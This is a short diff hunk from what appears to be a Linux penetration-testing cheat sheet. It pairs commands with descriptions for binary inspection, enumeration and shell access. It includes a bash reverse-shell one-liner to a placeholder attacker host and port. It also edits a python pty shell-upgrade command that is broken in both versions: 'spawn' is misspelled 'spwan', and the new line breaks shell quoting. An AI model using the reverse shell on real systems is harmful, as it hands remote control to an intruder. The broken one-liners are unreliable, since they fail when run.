@@ -10,5 +10,5 @@ ldd      ,:, Print shared libraries being used by the binary
 LinEnum.sh      ,:, Linux enumeration scripts
 gdb->list funcitons,:, To list all functions used in a binary
 bash -c 'bash -i </dev/tcp/AttackerIp/AttackerPort 2>&1 >&0' ,:,  Reverse shell on attacker machine using bash
-python3 -c 'import pty;pty.spwan("/bin/bash")' ,:, Gives a shell/terminal with some pre-built features, tab completion etc
+python3 -c 'import pty;pty.spwan(\'/bin/bash\')' ,:, Gives a shell/terminal with some pre-built features, tab completion etc
 
